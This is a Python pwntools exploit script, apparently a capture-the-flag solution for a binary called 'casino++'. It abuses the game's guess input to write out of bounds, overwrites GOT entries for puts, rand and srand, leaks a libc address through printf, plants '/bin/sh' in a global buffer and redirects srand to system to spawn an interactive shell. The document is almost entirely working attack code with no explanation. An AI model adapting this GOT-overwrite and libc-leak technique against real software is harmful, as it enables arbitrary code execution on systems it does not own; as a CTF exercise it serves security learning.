#!/usr/bin/python
# -*- coding: UTF-8 -*-
from pwn import *

context.arch = 'amd64'

p = process('./casino++')
elf = ELF('./libc.so')
# pause()

libc_start_main_offset = 0x21ab0

libc_start_main_got = 0x601ff0
puts_got = 0x602020
srand_got = 0x602040
rand_got = 0x602060
guess = 0x6020d0
name = 0x6020f0
seed = 0x602100

ret = 0x4006b6

srand_plt = 0x400720
printf_plt = 0x400706
casino = 0x40095d

libc_lottery = [0x3d, 0x44, 0x20, 0x16, 0x45, 0x14]
zero_lottery = [0x00 for i in range(6)]
six_lottery = [0x06 for i in range(6)]

def hijack_func(lotteries, old_got, new_got):

    if len(hex(new_got)) > 10 :
        front = int(hex(new_got)[::-1][8:][::-1][2:],16)
    else :
        front = 0
    back = int(hex(new_got)[::-1][0:8][::-1],16)

    for lottery in lotteries:
        p.sendlineafter(':', str(lottery+1))
    p.sendlineafter(']:', "1")
    # 後半
    p.sendlineafter(':', str((old_got - guess + 4)/4+1))
    p.sendlineafter(':', str(front))
    for lottery in lotteries:
        p.sendlineafter(':', str(lottery))
    p.sendlineafter(']:', "1")
    # 前半
    p.sendlineafter(':', str((old_got - guess)/4+1))
    p.sendlineafter(':', str(back))

pyload = flat(
    cyclic(0x10),
    libc_start_main_got
)

p.sendlineafter(':', pyload)
p.sendlineafter(':', "20")

# return to casino
hijack_func(libc_lottery, puts_got, casino)

# replace rand
hijack_func(libc_lottery, rand_got, ret)

# print libc_start_main
hijack_func(zero_lottery, srand_got, printf_plt)

p.recv()
elf.address = u64(p.recv(6) + '\0\0') - libc_start_main_offset

# recover rand
hijack_func(six_lottery, srand_got, srand_plt+6)

# put /bin/sh in name
hijack_func(zero_lottery, name, u64('/bin/sh\0'))

# put name's address in seed
hijack_func(zero_lottery, seed, name)

# replace srand
hijack_func(zero_lottery, srand_got, elf.sym.system)

p.interactive()
p.close()